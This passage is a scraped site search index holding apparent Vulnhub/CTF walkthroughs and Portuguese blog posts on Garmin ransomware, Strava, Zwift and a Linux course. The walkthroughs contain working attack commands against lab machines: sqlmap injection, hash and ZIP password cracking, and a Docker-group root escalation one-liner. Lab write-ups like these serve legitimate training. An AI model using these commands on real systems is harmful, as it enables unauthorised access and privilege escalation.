\\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0 ________________________________________________ :: Method : GET :: URL : http://localhost:9001/FUZZ.php :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ .htaccess [Status: 403, Size: 276, Words: 20, Lines: 10] .htpasswd [Status: 403, Size: 276, Words: 20, Lines: 10] account [Status: 200, Size: 0, Words: 1, Lines: 1] hacker [Status: 200, Size: 453, Words: 26, Lines: 26] index [Status: 200, Size: 572, Words: 49, Lines: 19] :: Progress: [20469/20469] :: Job [1/1] :: 4093 req/sec :: Duration: [0:00:05] :: Errors: 0 :: The login page was also vulnerable to SQL Injection, but it was not necessary.\nsqlmap -u http://localhost:9001 --data=&#34;username=admin&amp;password=admin&amp;submit=Submit&#34; --dbs Keep reading files&hellip;\nwww-data@ubuntu:/tmp$ locate hacker.php /var/www/files/hacker.phpwww-data@ubuntu:/var/www/files$ ls ls account.php hacker.php images index.php style.csscat /var/www/files/index.php ... try  $con = new PDO(&#34;mysql:dbname=webportal;host=localhost&#34;,&#34;root&#34;,&#34;!@m+her00+@db&#34;); $con-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);  ... +----+-----------+----------+-----------+----------------------------------+ | id | firstname | lastname | username | password | +----+-----------+----------+-----------+----------------------------------+ | 1 | Anurodh | Acharya | Aurick | 7e53614ced3640d5de23f111806cc4fd | | 2 | Apaar | Dahal | cullapaar | 686216240e5af30df0501e53c789a649 | +----+-----------+----------+-----------+----------------------------------+ Hash Type Result 7e53614ced3640d5de23f111806cc4fd md5 masterpassword 686216240e5af30df0501e53c789a649 md5 dontaskdonttell So far, I couldn&rsquo;t use any of MySQL information, so I&rsquo;ll keep looking further in the hacker.php 😑. There is something suspect there&hellip;🧐\nFirst thing I did was look at useful strings inside it background gif and hacker image, with no luck.\n┌──(root💀kali)-[~] └─# strings hacker-with-laptop_23-2147985341.jpg😕\nNext thing I tried to check these images with steghide&hellip;got something new&hellip;\n┌──(root💀kali)-[~] └─# steghide extract -sf hacker-with-laptop_23-2147985341.jpg Enter passphrase: wrote extracted data to &#34;backup.zip&#34;.No password was needed. =)\nNext, time to unzip backup.zip file, but none of last taken password could help me. =(\nWhy not try to crack it?\nFirst, get file hash to be cracked.\n┌──(root💀kali)-[~] └─# zip2john backup.zip &gt; hash.txt Created directory: /root/.john ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3┌──(root💀kali)-[~] └─# cat hash.txt backup.zip/source_code.php:$pkzip2$1*2*2*0*22a*4bb*69dc82f3*0*49*8*22a*69dc*2297*8e9e8de3a4b82cc98077a470ef800ed60ec6e205dc091547387432378de4c26ae8d64051a19d86bff2247f62dc1224ee79f048927d372bc6a45c0f21753a7b6beecfa0c847126d88084e57ddb9c90e9b0ef8018845c7d82b97b438a0a76e9a39c4846a146ae06efe4027f733ab63b509a56e2dec4c1dbce84337f0816421790246c983540c6fab21dd43aeda16d91addc5845dd18a05352ca9f4fcb45f0135be428c84dbac5a8d0c1fb2e84a7151ec3c1ae9740a84f2979d79da2e20d4854ef4483356cd078099725b5e7cf475144b22c64464a85edb8984cf7fc41d6a177f172c65e57f064700b6d49ef8298d83f42145e69befeab92453bd5f89bf827cd7993c9497eb2ad9868abd34b7a7b85f8e67404e2085de966e1460ad0ea031f895c7da70edbe7b7d6641dcdf6a4a31abc8781292a57b047a1cc5ce5ab4f375acf9a2ff4cac0075aa49e92f2d22e779bf3d9eacd2e1beffef894bc67de7235db962c80bbd3e3b54a14512a47841140e162184ca5d5d0ba013c1eaaa3220d82a53959a3e7d94fb5fa3ef3dfc049bdbd186851a1e7a8f344772155e569a5fa12659f482f4591198178600bb1290324b669d645dbb40dad2e52bf2adc2a55483837a5fc847f5ff0298fd47b139ce2d87915d688f09d8d167470db22bda770ce1602d6d2681b3973c5aac3b03258900d9e2cc50b8cea614d81bcfbb05d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip2$:source_code.php:backup.zip::backup.zipThen try to crack it with rockyou.txt wordlist.\n┌──(root💀kali)-[~] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status pass1word (backup.zip/source_code.php) 1g 0:00:00:00 DONE (2020-12-18 22:44) 10.00g/s 119680p/s 119680c/s 119680C/s fallen1..napster Use the &#34;--show&#34; option to display all of the cracked passwords reliably Session completedFile unziped.\n🛡️ Privilege Escalation &nbsp; Now we have anurodh user password.\n┌──(root💀kali)-[~] └─# echo &#34;IWQwbnRLbjB3bVlwQHNzdzByZA==&#34; | base64 -d !d0ntKn0wmYp@ssw0rdWe logged as Anurodh, and figure and immediately figured out the anurodh is member of Docker group, which service runs as root.\nThis part was particularly new for me, reading searching on Google and after reading this article, I reached my last goal, escalate privilege with Docker.\n$ docker run -it -v /:/mnt alpine chroot /mnt 🍻 Complete &nbsp; root@62ad51d2a37c:~# cat proof.txt cat proof.txt ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg Congratulations! You have successfully completed the challenge. ,-.-. ,----. _,.---._ .-._ ,----. ,-..-.-./ \\==\\ ,-.--` , \\ _.-. _.-. _,..---._ ,-.&#39; , - `. /==/ \\ .-._ ,-.--` , \\ | , \\=/\\= | - | == | | == | - _.-` .-,.&#39; | .-,.&#39; | /==/, - \\ /==/_, , - \\|== | , \\/ /, /== | - _.-` | | ------- |/ |/ , /==/|==| `.-.|==|, | |==|, | |==| _ _\\==| .=. |==|- \\| ||==| `.-. \\, , _|==/==/_ , /|==|- | |==|- | |==| .=. |==|_ : ;=: - |==| , | -/==/_ , / | - - , |==|==| .-&#39; |==|, | |==|, | |==|,| | -|==| , &#39;=&#39; |==| - _ |==| .-&#39; \\ , - /==/|==|_ ,`-._|==|- `-._|==|- `-._ |==| &#39;=&#39; /\\==\\ - ,_ /|==| /\\ , |==|_ ,`-._ |- /\\ /==/ /==/ , //==/ - , ,/==/ - , ,/ |==|-, _`/ &#39;.=&#39;. - .&#39; /==/, | |- /==/ , / `--` `--` `--`-----`` `--`-----&#39;`--`-----&#39; `-.`.____.&#39; `--`--&#39;&#39; `--`./ `--`--`-----`` --------------------------------------------Designed By ------------------------------------------------------- | Anurodh Acharya | --------------------- Let me know if you liked it. Twitter - @acharya_anurodh Linkedin - www.linkedin.com/in/anurodh-acharya-b1937116a"}).add({id:27,tag:"en",href:"/tags/cissp/",title:"Cissp",description:"",content:""}).add({id:28,tag:"en",href:"/tags/cloud-computing/",title:"Cloud Computing",description:"",content:""}).add({id:29,tag:"en",href:"/tags/coleta-de-informa%C3%A7%C3%B5es/",title:"Coleta De Informações",description:"",content:""}).add({id:30,tag:"en",href:"/blog/carregando_treinos_garmin_para_strava/",title:"Como carregar atividades manualmente do relógio Garmin para o Strava",description:"A ransomware story. 😞 Além do procedimento, uma explicação do incidente que pôde ter custado ao Garmin milhões de dólares!  💸💸💸",content:`Sumário &nbsp; Sumário A notícia O problema de US$10 milhões Carregando manualmente dados para o Strava &nbsp; Se você veio até aqui pelo procedimento de carregamento manual no Strava, clique aqui! A notícia &nbsp; Nesta semana do dia 20 de Julho de 2020, todos os usuários de dispositivos Garmin ao redor do mundo, que utilizam seus serviços de nuvem, como o Garmin Connect, foram surpreendidos com a impossibilidade de sincronização de dados e atualização de dispositivos. Ao verificar na página de status de serviços da Garmin observamos que todos os serviços estavam down. Mas o que será que aconteceu?
Nos dispositivos móveis podemos ver as mensagens de erro com as abaixo.
Ao procurar em alguns forums e sites especializados da Asia, onde naturalmente foram os primeiros impactados chegamos a conclusão que algo sério tinha acontecido. Como pode ser visto nos links abaixo:
https://www.reddit.com/r/kansascity/comments/hwg8vt/garmin_hacked/ https://translate.google.com/translate?sl=auto&tl=en&u=https%3A%2F%2Fwww.ithome.com.tw%2Fnews%2F139004 https://the5krunner.com/2020/07/23/garminpocalypse-major-outage-workaround-hacked-or-messed-up/ Dias depois vieram a confirmação através de outros veículos de imprensa.
CNN
Forbes
O problema de US$10 milhões &nbsp; Segundo a TechCrunch em um texto atualizado neste sábado dia 25/07/2020, o comprometimento dos serviços da Garmin foram causados devido a um ataque de ransomware, de acordo com fontes distintas consultadas.
Uma das fontes consultadas confirmou que se tratava especificamente do ransomware WastedLocker, que segundo a Malwarebytes é um malware operado pelo grupo chamado Evil Corp, que visa sempre organizações específicas.
Mas que diabos é um ransomware?
&nbsp; Ransomware é um software malicioso que infecta seu computador e exibe mensagens exigindo o pagamento de uma taxa para fazer o sistema voltar a funcionar. Essa classe de malware é um esquema de lucro criminoso, que pode ser instalado por meio de links enganosos em uma mensagem de e-mail, mensagens instantâneas ou sites. Uma solicitação de resgate parecido com o abaixo pode ter aparecido no ambiente da Garmin após ter seus sistemas criptografados.
Pelo tempo que os serviços estão indisponíveis, claramente a Garmin não possuía uma infraestrutura que seguisse as melhores práticas de segurança, e isso falamos de um espectro enorme de requisitos técnicos e de governança. Além disso, infelizmente, fica evidente que não estão utilizam de práticas de escalabilidade de infraestrutura com nuvem e infraestrutura como código.
Será que a Garmin irá pagar pelo resgate de seus sistemas?
Carregando manualmente dados para o Strava &nbsp; Conecte seu dispositivo Garmin na porta USB do seu computador. No meu caso, estou utilizando o Windows 10.
Aparecerá um disco removível na lista de drives do seu computador.
Seus treinos estarão gravados na pasta ACTIVITY. Todos os arquivos possuem a extensão .FIT.
Mas ainda voltaremos nesta parte.
Acesse sua conta no Strava, clique no sinal de + e depois em Carregar atividade.
Escolha Arquivo, e depois clique em Choose files.
Selecione todos os treinos que deseja carregar.
Após o carregamento, todos os seus treinos aparecerão numa mesma página para qualquer alteração que deseja realizar, como por exemplo o nome do treino, e posteriormente confirmar.
Pronto! Seus treinos estão disponíveis no Strava para visualizão completa dos dados do treino!`}).add({id:31,tag:"en",href:"/blog/zwift_forerunner235/",title:"Como configurar o Zwift com Garmin Forerunner 235, Foopod e ANT+",description:"",content:`Introdução &nbsp; Neste período de quarentena tem se intensificado a utilização de dispositivos para mensurar o volume de exercícios realizados indoor. Para quem tem esteira em casa houve um boom de relógios com bons potenciômetros ou footpods, que são pequenos dispositivos amarrados ao seu tênis que são capazes de medir a distancia dos seus passos, consequentemente a distância percorrida, com baixa margem de erro.
Além disso, houve uma procura muito grande de sistemas que pudessem ajudar no entretenimento durante uma corrida ou ciclismo indoor, onde o Zwift entra em cena.
O Zwift é um simulador de corrida ou ciclismo que pode ser instalado em seu computador, iPad, iPhone ou Apple TV, permitindo que você corra ou pedale com outros atletas em um ambiente virtual, ajudando assim a aliviar parte do tédio dos exercícios em ambiente fechado.
No meu caso, com exceção da esteira que tive que adquirir pra permanecer treinando razoavelmente, eu já possuía todos os ítens necessários. Hoje possuo o Garmin Forerunner 235, e como eu treinava bastante em esteira, eu tenho fixação por exatidão e registro dos meus treinos, assim decidi também há pelo menos 3 anos comprar um footpod da Garmin para controlar os treinos em esteira.
Meu primeiro relógio de corrida foi um Garmin Forerunner 610, como ele não possuía comunicação Bluetooth, ele se comunicava com o computador através de uma dispositivo Ant+, que além de ser usado para sincronismo de dados de corridas gravadas, ele também e capaz de captar em tempo real o que o relógio está registrando.
Setup &nbsp; Aqui vou direto ao assunto baseado em no setup que possuo, caso tenham dúvidas, podem deixar nos comentários que irei responder brevemente.
Entenda a comunicação &nbsp; Abaixo coloquei mostro de forma sequencial como funciona a comunicação entre os dispositivos.
Relógio GPS Forerunner 235, que captará as comunicações do footpod. Footpod envia as informações dos passos para o relógio. ANT+ receberá em tempo real as informações enviadas pelo relógio. O Zwift já configurado recebe as informações e envia para o simulador. Smart TV recebendo os dados do computador. Momento de diversão! 😎 Utilizando a versão free do Zwift, em circuiti curto Passo a passo &nbsp; Criar conta em Zwift.com. Você pode usar de forma gratuíta, porém com diversas limitações, como percursos, eventos e etc. Realizar o download para o seus computador. Plugar o dispositivo Ant+ em seu computador. Parar o Ant+ com seu Forerunner. Mais detalhes aqui. Configurar seu dispositivo Ant+ no Zwift. Mais detalhes aqui e aqui. Sincronizar seu footpod com seu Forerunner, Mais detalhes aqui. Executar o simulador Zwift e pé na esteira! 🏃🏿‍♂️ Referências &nbsp; Zwift Running Setup: Best Footpods https://www.youtube.com/watch?v=cSRiinN7sSg
Zwift Running - Testing ANT+ Garmin Footpod https://www.youtube.com/watch?v=cCFxqJ_iejM
Connecting Your ANT+ Dongle to Zwift — Official Instructions | Zwift https://www.youtube.com/watch?v=yb7gidaq-xU
Zwift | Ultimate Footpod Battle | Stryd, Garmin, Milestone, Polar, Tickr https://www.youtube.com/watch?v=MT07ncU9GJA
How To Use Zwift Running | A Beginners Guide https://www.youtube.com/watch?v=G6Ukvo64kn4
RECOMMENDED ANT+ STICKS (DONGLES) FOR ZWIFT https://zwiftinsider.com/ant-dongles-for-zwift/
Issues with Zwift Finding Your USB ANT+ Dongle https://support.zwift.com/en_us/issues-with-zwift-finding-your-usb-ant-dongle-BkxCqa2GB
Pairing ANT‍+ Sensors https://www8.garmin.com/manuals/webhelp/forerunner230/EN-US/GUID-AE5D9A3D-4AC1-4968-829B-549DAF0ED564.html
Garmin Foot Pod Setup https://www.youtube.com/watch?v=JgDmmY2iHIQ
Foot Pod https://www8.garmin.com/manuals/webhelp/forerunner235/EN-US/GUID-5B7E3136-E4DC-47ED-89EB-60794DCF1408.html`}).add({id:32,tag:"en",href:"/tags/comunidade/",title:"Comunidade",description:"",content:""}).add({id:33,tag:"en",href:"/tags/conference/",title:"Conference",description:"",content:""}).add({id:34,tag:"en",href:"/tags/confinamento/",title:"Confinamento",description:"",content:""}).add({id:35,tag:"en",href:"/tags/conscientiza%C3%A7%C3%A3o/",title:"Conscientização",description:"",content:""}).add({id:36,tag:"en",href:"/tags/container/",title:"Container",description:"",content:""}).add({id:37,tag:"en",href:"/tags/coronavirus/",title:"Coronavirus",description:"",content:""}).add({id:38,tag:"en",href:"/tags/corrida/",title:"Corrida",description:"",content:""}).add({id:39,tag:"en",href:"/tags/criptography/",title:"Criptography",description:"",content:""}).add({id:40,tag:"en",href:"/tags/css/",title:"Css",description:"",content:""}).add({id:41,tag:"en",href:"/tags/ctf/",title:"Ctf",description:"",content:""}).add({id:42,tag:"en",href:"/blog/curso_de_linux/",title:"Curso de Linux – Módulo 1 – Iniciante",description:"Apresentações do curso básico de Linux ministrado em 2011.",content:`Iniciou-se no mês de Outubro de 2011 as aulas de Linux para colaboradores da Teleperformance Brasil, módulo Iniciante.
A partir do dia 01/02/2013 o conteúdo deste curso foi aberto para o público. Use e abuse deste material! =)
Clique no link abaixo para baixar.
https://bit.ly/2XGha9V
Apresentações das aulas
Iniciante – Aula 1 História e visão geral do sistema operacional Instalação do sistema operacional em máquina virtual Iniciante – Aula 2 Introdução à estrutura de diretórios e suas funções Comandos de gerenciamento de sistema de arquivos Comandos de gerenciamento de arquivos e diretórios Editando arquivos com o VI Iniciante – Aula 3 Primeiros comandos de rede e acesso remoto por SSH (Secure Shell) Montagem de dispositivos de armazenamento Manipulando partições com o cfdisk Iniciante – Aula 4 Alias, variáveis e arquivo de ambiente de usuários Instalação de programas Pacotes .deb APT-GET e APTITUDE Pacotes .rpm Iniciante – Aula 5 Gerenciamento de processos Níveis de execução e o processo init SYSTEM V Iniciante – Aula 6 Programação em Shell Script Exercícios Iniciante – Aula 7 Empacotadores, compactadores e procedimentos de backup Data e hora do sistema e agendamento de tarefas At Cron`}).add({id:43,tag:"en",href:"/tags/cve-2021-44228/",title:"CVE-2021-44228",description:"",content:""}).add({id:44,tag:"en",href:"/tags/cve-2021-45046/",title:"CVE-2021-45046",description:"",content:""}).add({id:45,tag:"en",href:"/tags/cve-2021-45105/",title:"CVE-2021-45105",description:"",content:""}).add({id:46,tag:"en",href:"/tags/cyber-kill-chain/",title:"Cyber Kill Chain",description:"",content:""}).add({id:47,tag:"en",href:"/tags/cybersecurity/",title:"Cybersecurity",description:"",content:""}).add({id:48,tag:"en",href:"/tags/data-analytics/",title:"Data Analytics",description:"",content:""}).add({id:49,tag:"en",href:"/tags/data-privacy/",title:"Data Privacy",description:"",content:""}).add({id:50,tag:"en",href:"/tags/development/",title:"Development",description:"",content:""}).add({id:51,tag:"en",href:"/blog/devguru1_vulnhub/",title:"DevGuru: 1 - Vulnhub ",description:"DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.",content:`Table of contents &nbsp; Table of contents 🔎 Enumeration Port scan Web discovery Nikto ffuf Nuclei Git-dumper 🚪🚶 Foothold 🛡️ Privilege Escalation 🍻 Complete 🔎 Enumeration &nbsp; Port scan &nbsp; Fast nmap scan.
┌──(tiago㉿kali)-[~] └─$ nmap -sT -p- --open 192.168.0.63 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 11:22 -03 Nmap scan report for 192.168.0.63 Host is up (0.0035s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8585/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 16.46 secondsNmap scan in detail.
┌──(tiago㉿kali)-[~] └─$ sudo nmap -sV -A -O -p22,80,8585 192.168.0.63 1 ⨯ [sudo] password for tiago: Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 11:24 -03 Nmap scan report for 192.168.0.63 Host is up (0.0018s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA) | 256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA) |_ 256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: DevGuru | http-git: | 192.168.0.63:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file &#39;description&#39; to name the... | Last commit message: first commit | Remotes: | http://devguru.local:8585/frank/devguru-website.git |_ Project type: PHP application (guessed from .gitignore) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Corp - DevGuru 8585/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 | Set-Cookie: i_like_gitea=60a60f9a3f2071e6; Path=/; HttpOnly | Set-Cookie: _csrf=gZLNwT-DkBTkP2Femsn0l4c6rU46MTYwNzYxMDI5MDY1NDc0OTg2Mg; Path=/; Expires=Fri, 11 Dec 2020 14:24:50 GMT; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Thu, 10 Dec 2020 14:24:50 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-&#34;&gt; | &lt;head data-suburl=&#34;&#34;&gt; | &lt;meta charset=&#34;utf-8&#34;&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;ie=edge&#34;&gt; | &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;/manifest.json&#34; crossorigin=&#34;use-credentials&#34;&gt; | &lt;meta name=&#34;theme-color&#34; content=&#34;#6cc644&#34;&gt; | &lt;meta name=&#34;author&#34; content=&#34;Gitea - Git with a cup of tea&#34; /&gt; | &lt;meta name=&#34;description&#34; content=&#34;Gitea (Git with a cup of tea) is a painless | HTTPOptions: | HTTP/1.0 404 Not Found | Content-Type: text/html; charset=UTF-8 | Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 | Set-Cookie: i_like_gitea=5dba56f953e777cd; Path=/; HttpOnly | Set-Cookie: _csrf=qFWDFJyuERvO3K1gxAiy1eV2lG86MTYwNzYxMDI5MDc3MDAyMjI4Ng; Path=/; Expires=Fri, 11 Dec 2020 14:24:50 GMT; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Thu, 10 Dec 2020 14:24:50 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-&#34;&gt; | &lt;head data-suburl=&#34;&#34;&gt; | &lt;meta charset=&#34;utf-8&#34;&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;ie=edge&#34;&gt; | &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;/manifest.json&#34; crossorigin=&#34;use-credentials&#34;&gt; | &lt;meta name=&#34;theme-color&#34; content=&#34;#6cc644&#34;&gt; | &lt;meta name=&#34;author&#34; content=&#34;Gitea - Git with a cup of tea&#34; /&gt; |_ &lt;meta name=&#34;description&#34; content=&#34;Gitea (Git with a c 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8585-TCP:V=7.91%I=7%D=12/10%Time=5FD22FB2%P=x86_64-pc-linux-gnu%r(G SF:enericLines,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request&#34;)%r(GetRequest,2A02,&#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type: SF:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=/ SF:;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=60a60f9a3f2071e6 SF:;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=gZLNwT-DkBTkP2Femsn0l4 SF:c6rU46MTYwNzYxMDI5MDY1NDc0OTg2Mg;\\x20Path=/;\\x20Expires=Fri,\\x2011\\x20D SF:ec\\x202020\\x2014:24:50\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEO SF:RIGIN\\r\\nDate:\\x20Thu,\\x2010\\x20Dec\\x202020\\x2014:24:50\\x20GMT\\r\\n\\r\\n&lt; SF:!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&#34;en-US\\&#34;\\x20class=\\&#34;theme-\\&#34;&gt;\\n&lt;head\\ SF:x20data-suburl=\\&#34;\\&#34;&gt;\\n\\t&lt;meta\\x20charset=\\&#34;utf-8\\&#34;&gt;\\n\\t&lt;meta\\x20name=\\&#34; SF:viewport\\&#34;\\x20content=\\&#34;width=device-width,\\x20initial-scale=1\\&#34;&gt;\\n\\t&lt;m SF:eta\\x20http-equiv=\\&#34;x-ua-compatible\\&#34;\\x20content=\\&#34;ie=edge\\&#34;&gt;\\n\\t&lt;title SF:&gt;\\x20Gitea:\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\x20&lt;/title&gt;\\n\\t&lt;lin SF:k\\x20rel=\\&#34;manifest\\&#34;\\x20href=\\&#34;/manifest\\.json\\&#34;\\x20crossorigin=\\&#34;use- SF:credentials\\&#34;&gt;\\n\\t&lt;meta\\x20name=\\&#34;theme-color\\&#34;\\x20content=\\&#34;#6cc644\\&#34;&gt; SF:\\n\\t&lt;meta\\x20name=\\&#34;author\\&#34;\\x20content=\\&#34;Gitea\\x20-\\x20Git\\x20with\\x20 SF:a\\x20cup\\x20of\\x20tea\\&#34;\\x20/&gt;\\n\\t&lt;meta\\x20name=\\&#34;description\\&#34;\\x20conte SF:nt=\\&#34;Gitea\\x20\\(Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\)\\x20is\\x20a\\x20pa SF:inless&#34;)%r(HTTPOptions,212A,&#34;HTTP/1\\.0\\x20404\\x20Not\\x20Found\\r\\nConten SF:t-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x2 SF:0Path=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=5dba56f95 SF:3e777cd;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=qFWDFJyuERvO3K1 SF:gxAiy1eV2lG86MTYwNzYxMDI5MDc3MDAyMjI4Ng;\\x20Path=/;\\x20Expires=Fri,\\x20 SF:11\\x20Dec\\x202020\\x2014:24:50\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x SF:20SAMEORIGIN\\r\\nDate:\\x20Thu,\\x2010\\x20Dec\\x202020\\x2014:24:50\\x20GMT\\r SF:\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&#34;en-US\\&#34;\\x20class=\\&#34;theme-\\&#34;&gt;\\ SF:n&lt;head\\x20data-suburl=\\&#34;\\&#34;&gt;\\n\\t&lt;meta\\x20charset=\\&#34;utf-8\\&#34;&gt;\\n\\t&lt;meta\\x20 SF:name=\\&#34;viewport\\&#34;\\x20content=\\&#34;width=device-width,\\x20initial-scale=1\\&#34; SF:&gt;\\n\\t&lt;meta\\x20http-equiv=\\&#34;x-ua-compatible\\&#34;\\x20content=\\&#34;ie=edge\\&#34;&gt;\\n\\ SF:t&lt;title&gt;Page\\x20Not\\x20Found\\x20-\\x20\\x20Gitea:\\x20Git\\x20with\\x20a\\x20 SF:cup\\x20of\\x20tea\\x20&lt;/title&gt;\\n\\t&lt;link\\x20rel=\\&#34;manifest\\&#34;\\x20href=\\&#34;/ma SF:nifest\\.json\\&#34;\\x20crossorigin=\\&#34;use-credentials\\&#34;&gt;\\n\\t&lt;meta\\x20name=\\&#34;t SF:heme-color\\&#34;\\x20content=\\&#34;#6cc644\\&#34;&gt;\\n\\t&lt;meta\\x20name=\\&#34;author\\&#34;\\x20con SF:tent=\\&#34;Gitea\\x20-\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\&#34;\\x20/&gt;\\n\\t&lt;m SF:eta\\x20name=\\&#34;description\\&#34;\\x20content=\\&#34;Gitea\\x20\\(Git\\x20with\\x20a\\x2 SF:0c&#34;); MAC Address: 08:00:27:FF:2C:BE (Oracle VirtualBox virtual NIC) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.6 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 1.83 ms 192.168.0.63 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.57 secondsSite DevGuru available in port 80.
Gitea in port 8585.
Web discovery &nbsp; Nikto &nbsp; Scanning and enumerating all websites.
┌──(root💀kali)-[/home/tiago] └─# nikto -h 192.168.0.63 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.0.63 + Target Hostname: 192.168.0.63 + Target Port: 80 + Start Time: 2020-12-10 11:37:30 (GMT-3) --------------------------------------------------------------------------- + Server: Apache/2.4.29 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs) + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + OSVDB-3093: /.htaccess: Contains configuration and/or authorization information + OSVDB-3233: /icons/README: Apache default file found. + OSVDB-3092: /.git/index: Git Index file may contain directory listing information. + /.git/HEAD: Git HEAD file found. Full repo details may be present. + /.git/config: Git config file found. Infos about repo details may be present. + X-XSS-Protection header has been set to disable XSS Protection. There is unlikely to be a good reason for this. + /.gitignore: .gitignore file found. It is possible to grasp the directory structure. + 7915 requests: 0 error(s) and 11 item(s) reported on remote host + End Time: 2020-12-10 11:40:03 (GMT-3) (153 seconds) --------------------------------------------------------------------------- + 1 host(s) tested┌──(tiago㉿kali)-[~] └─$ nikto -h 192.168.0.63:8585 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.0.63 + Target Hostname: 192.168.0.63 + Target Port: 8585 + Start Time: 2020-12-10 11:37:50 (GMT-3) --------------------------------------------------------------------------- + Server: No banner retrieved + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Cookie lang created without the httponly flag + No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs) + Uncommon header &#39;content-disposition&#39; found, with contents: attachment; filename=favicon.png + Uncommon header &#39;content-transfer-encoding&#39; found, with contents: binary + Uncommon header &#39;content-description&#39; found, with contents: File Transfer + Cookie redirect_to created without the httponly flag + /debug/: Possible debug directory/program found. + 7919 requests: 0 error(s) and 8 item(s) reported on remote host + End Time: 2020-12-10 11:38:19 (GMT-3) (29 seconds) --------------------------------------------------------------------------- + 1 host(s) tested ffuf &nbsp; Doing some enumeration with ffuf
